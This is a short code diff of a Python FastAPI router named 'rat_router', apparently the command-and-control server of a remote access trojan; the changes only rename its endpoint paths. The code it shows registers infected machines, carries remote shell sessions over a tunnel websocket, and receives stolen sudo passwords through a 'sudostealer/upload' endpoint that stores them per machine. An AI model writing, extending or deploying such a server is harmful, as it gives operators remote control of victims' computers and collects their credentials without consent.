@@ -6,7 +6,7 @@ from uid import Uid, gen_uid
 
 rat_router = APIRouter()
 
-@rat_router.get("/api/{version}/register")
+@rat_router.get("/{version}/register")
 async def register_machine(version: int, request: Request) -> Uid:
 	id = gen_uid()
 	machines.all[id] = machines.Machine(id=id, version=version)
@@ -14,7 +14,7 @@ async def register_machine(version: int, request: Request) -> Uid:
 	print("Registered: ", id)
 	return id
 
-@rat_router.websocket("/ws/{version}/{machine_id}")
+@rat_router.websocket("/{version}/ws/{machine_id}")
 async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine_id: Uid):
 	await websocket.accept()
 	try:
@@ -47,7 +47,7 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 	finally:
 		await machines.all[machine_id].on_disconnect(websocket.client.host)
 
-@rat_router.websocket("/api/{version}/tunnel/{tunnel_id}")
+@rat_router.websocket("/{version}/tunnel/{tunnel_id}")
 async def shell_websocket_endpoint(websocket: WebSocket, version: int, tunnel_id: Uid):
 	await websocket.accept()
 	try:
@@ -65,7 +65,7 @@ async def shell_websocket_endpoint(websocket: WebSocket, version: int, tunnel_id
 			await con.tunnels[tunnel_id].close()
 			del con.tunnels[tunnel_id]
 
-@rat_router.post("/api/{version}/{machine_id}/sudostealer/upload")
+@rat_router.post("/{version}/{machine_id}/sudostealer/upload")
 async def upload_credentials(version: int, machine_id: Uid, request: Request) -> None:
 	text = (await request.body()).decode()
 	machines.all[machine_id].sudostealer.credentials.append(text)
